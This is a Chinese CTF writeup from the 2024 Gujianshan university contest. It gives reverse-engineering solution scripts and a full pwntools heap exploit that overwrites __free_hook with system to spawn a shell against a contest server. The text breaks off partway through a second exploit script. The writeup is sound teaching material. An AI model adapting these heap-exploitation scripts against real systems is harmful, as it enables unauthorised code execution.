---
title: 2024“古剑山”第二届全国大学生网络攻防大赛 writeup by Mini-Venom
url: https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247511677&idx=1&sn=cc799921f99e6eda99a5525b30c88cee&chksm=e89d86a5dfea0fb3fb8533f3c57d3c6c00c291cba72832d8619c3f7cfe20e6a6c450f2458764&scene=58&subscene=0#rd
source: ChaMd5安全团队
date: 2024-12-04
fetch_date: 2025-10-06T19:39:12.161972
---

# 2024“古剑山”第二届全国大学生网络攻防大赛 writeup by Mini-Venom

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/PUubqXlrzBRbQ1RGdjjicfP98dK1yickSicShkC5t9rwwnPhA8WpnNhacDA4zEggajPKvXz09icvSThd3Ugib8ogsbg/0?wx_fmt=jpeg)

# 2024“古剑山”第二届全国大学生网络攻防大赛 writeup by Mini-Venom

Mini-Venom

ChaMd5安全团队

> > 招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱
> >
> > admin@chamd5.org(带上简历和想加入的小组)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBRbQ1RGdjjicfP98dK1yickSic3O5EIjbdKG6WpwrLWibxlHQF9lRp68BfgPTcBpGBYNUI9PUKNONK9yA/640?wx_fmt=png&from=appmsg)

## Reverse | India Pale Ale

先走的RC4，然后base64，注意几个init的变换

init里面对于密文的变换

```
table=[0xe8,0xe8,0xc4,0xca,0xa1,0xd2,0xd3,0xfd,0xa0,0xa0,0xc1,0xf9,0xa9,0xd8,0xfd,0xea,0xdc,0xd1,0xe0,0xc2,0xc5,0xa8,0xa6,0xe1,0xe8,0xd3,0xf7,0xd5,0xa5,0xc4,0xf3,0xd8,0xc9,0xa1,0xde,0xd2,0xe5,0xe7,0xdf,0xf7,0xe0,0xd8,0xe0,0xd7]
processed_table = []
for x in table:
    processed_table.append((x & 0xFF) ^ 0x90)

# 将结果转换为字节并解码为字符串
result_bytes = bytes(processed_table)
decoded_result = result_bytes.decode()
print(decoded_result)
```

码表的变换

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBRbQ1RGdjjicfP98dK1yickSicXyYuznV2zVgAicBFRKb1rGltJhWc0gibNzIkxk2AIHFhX6LaMX8fDS2Q/640?wx_fmt=png&from=appmsg)

QQ\_1732974534312

```
#include <stdio.h>

int main()
{

 int v0 = 0LL;
   int v1 = 0;
   int v3=0,v4=0,v2=0;
 unsigned int v10[]={0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09,
  0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10, 0x11, 0x12, 0x13,
  0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D,
  0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27,
  0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x30, 0x31,
  0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3A, 0x3B,
  0x3C, 0x3D, 0x3E, 0x3F};

  unsigned char aAbcdefghijklmn[] =
{
  0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4A,
  0x4B, 0x4C, 0x4D, 0x4E, 0x4F, 0x50, 0x51, 0x52, 0x53, 0x54,
  0x55, 0x56, 0x57, 0x58, 0x59, 0x5A, 0x61, 0x62, 0x63, 0x64,
  0x65, 0x66, 0x67, 0x68, 0x69, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E,
  0x6F, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78,
  0x79, 0x7A, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37,
  0x38, 0x39, 0x2B, 0x2F
};

 unsigned int byte_100007F00[]={0x0D, 0x11, 0x13, 0x17, 0x1D, 0x00, 0x00, 0x00};

 do
  {
    v2 = *(v10 + v0);
    v3 = v1 + v2 + byte_100007F00[v0 % 5u];
    v4 = v3 + 63;
    if ( v3 >= 0 )
      v4 = v3;
    v1 = v3 - (v4 & 0xFFFFFFC0);
    *(v10 + v0) = *(v10 + v1);
    *(v10 + v1) = v2;
    ++v0;
  }while ( v0 != 64 );

 for ( int i = 0LL; i != 64; ++i )
 {
  printf("%c",aAbcdefghijklmn[*(v10 + i)]);
 }

 return 0;
}

```

还有RC4 key的变换

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBRbQ1RGdjjicfP98dK1yickSicEzg34MVuPIyWO19ewBBLfLcKeLjkYk6q5CWU1Gj69kPouvN3y2nEhQ/640?wx_fmt=png&from=appmsg)

QQ\_1732974551245

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBRbQ1RGdjjicfP98dK1yickSic18dMZsuocmNQolrTh1zy8vtwKo9xwIfENSVS26hMBLwGkyMUtHDhBw/640?wx_fmt=png&from=appmsg)

QQ\_1732974813575

### Reverse | re

经典vmp，直接无敌脱壳机启动！

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBRbQ1RGdjjicfP98dK1yickSicgPWcsFulHtRFKzQtZ2Ze3S1dou3CrPBQ14fj5YghHy6pGtgnawxbjw/640?wx_fmt=png&from=appmsg)

QQ\_1732978657971

无敌脱壳机器，接连启动三次才脱干净（雾）

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBRbQ1RGdjjicfP98dK1yickSicwzT6J9bFs5WxUwnP1I51JZe6qca6fF52EpNAwhPDJxic82ia1weg0DNQ/640?wx_fmt=png&from=appmsg)

QQ\_1732978796468

拉入ida之后直接看主逻辑，还算能看（喜）

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBRbQ1RGdjjicfP98dK1yickSicsUUnWkEE5rQEPacOuYyiaWl2OJ5JXGt4ROMyyJxVfAm9TmozmWVhPQQ/640?wx_fmt=png&from=appmsg)

QQ\_1732982417934

主要就是看最后的check部分

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBRbQ1RGdjjicfP98dK1yickSic1Yx8WGbRGbsDEXkyUFJgl4OgPOwU66ZX1We8qHaBguAyMupPVvgZOQ/640?wx_fmt=png&from=appmsg)

QQ\_1732982434043

就是两段字符的替换，前四个字符的check

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBRbQ1RGdjjicfP98dK1yickSicnKB4mzWCYO7Us7FCZZvb93wiaSjDug0P6lxJvEXRf75SKV1h8JBLK1w/640?wx_fmt=png&from=appmsg)

QQ\_1732982488407

a2+24的地方既是最后的flag四个字符

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBRbQ1RGdjjicfP98dK1yickSicI1PZQLkoop1jBt1lI2oGJQa5V8iaOzOxQicQ1J49iaWuLOmU7evSsNv2w/640?wx_fmt=png&from=appmsg)

QQ\_1732982547101

此处绕过前四个字符的check之后就是一个字符的更替，前八个字符中y换成7，z换成8

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBRbQ1RGdjjicfP98dK1yickSicoO8WZNORSziaknK4sx10SOu112BZmmECyadj1Syib0YKo8ec8Kx6qichQ/640?wx_fmt=png&from=appmsg)

QQ\_1732982601280

然后后面的逻辑也是这样，都是y换7，z换8

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBRbQ1RGdjjicfP98dK1yickSicq75Wz6whicARv5TVticWIDficlkhQYLicyyWKf1RYOgPwAMQocwTRfvnAA/640?wx_fmt=png&from=appmsg)

QQ\_1732982648803

```
data="flag{de21cz4ycedfz16az31zd2dycy65ac41}"

for i in range(len(data)):
    if(data[i]=='y'):
        print("7",end='')
    elif(data[i]=='z'):
        print("8",end='')
    else:
        print(data[i],end='')
```

## Pwn | mis

2.27堆题，经典菜单题

add,free,show,edit四个功能函数

其中free和edit没有什么问题，保护全开，got表不可打

漏洞在于add中有堆溢出，strdun根据输入字符串大小分配堆块，同时也具有堆溢出

做好堆布局后，house of fotcake泄露libc地址，后续堆溢出攻击free\_hook

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBRbQ1RGdjjicfP98dK1yickSicbhcoBuq3lte2vwFBNUxz2iaYhsrMGY0icpvCYlJ8Fk5Sg20alXrGVHfw/640?wx_fmt=png&from=appmsg)

image-20241201091834115

```
from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
 gdb.attach(p)
 pause()
def s(a):
 p.send(a)
def sa(a,b):
 p.sendafter(a,b)
def sl(a):
 p.sendline(a)
def sla(a,b):
 p.sendlineafter(a,b)
def r(a):
 p.recv(a)
#def pr(a):
 #print(p.recv(a))
def rl(a):
 return p.recvuntil(a)
def inter():
 p.interactive()
def get_addr64():
 return u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))
def get_addr32():
 return u32(p.recvuntil("\xf7")[-4:])
def get_sb():
 return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/sh\x00").__next__()
def get_hook():
 return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')

#context(os='linux',arch='i386',log_level='debug')
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('./libc.so.6')
#libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6')
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
#libc=ELF('libc-2.23.so')
#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF('./pwn')
p==remote('47.106.14.25',33189)
#p = process('./pwn')
def add(i,size,content):
    rl('4.show\n')
    sl(str(1))
    rl(': ')
    sl(str(i))
    rl(': ')
    sl(str(size))
    rl(': ')
    s(content)
def free(i):
    rl('4.show\n')
    sl(str(2))
    rl(': ')
    sl(str(i))
def edit(i,content):
    rl('4.show\n')
    sl(str(3))
    rl(': ')
    sl(str(i))
    rl(': ')
    s(content)
def show(i):
    rl('4.show\n')
    sl('4')
    rl(': ')
    sl(str(i))

add(10,0xa0,b'a'*(0x10))
add(11,0xa0,b'a'*(0x10))
add(12,0xa0,b'a'*(0x10))

for i in range(10):#9
 add(i,0xff,b'a'*0xf0)

for i in range(7):
 free(i)

free(7)
add(7,0xa0,b'a'*0x9)
show(7)
libc_base=get_addr64()-4063329
li(hex(libc_base))
free_hook=libc_base+libc.sym['__free_hook']
system=libc_base+libc.sym['system']
free(12)
free(11)

edit(10,b'\x00'*(0x18)+p64(0x21)+p64(free_hook))
add(11,0xa0,b'/bin/sh\x00')
add(12,0xa0,p64(system))
add(13,0xa0,b'/bin/sh\x00')
#bug()

free(11)

inter()
```

## Pwn | in

两个漏洞点：size[size\_4]和size[\_4+0x1f]任意地址写1字节，以及任意地址写三字节

我们可以申请一个在libc上的大堆块，控制好size\_4，使size\_4为\x18size\_4+0x1f为\x00，也就是攻击\_IO\_2\_1\_stdout\_的\_flags、\_IO\_write\_base，泄露出来libc，后续任意地址写攻击exit\_hook（ \_rtld\_global+3848），爆破一下ld地址就可以

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBRbQ1RGdjjicfP98dK1yickSicfLjCSAIcHG4Uehvr4ZcsrBxwQDbYtepCJb8vY8IzeytFOmib1JLgGFw/640?wx_fmt=png&from=appmsg)

image-20241201092654609

```
from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
 gdb.attach(p)
 pause()
def s(a):
 p.send(a)
def sa(a,b):
 p.sendafter(a,b)
def sl(a):
 p.sendl...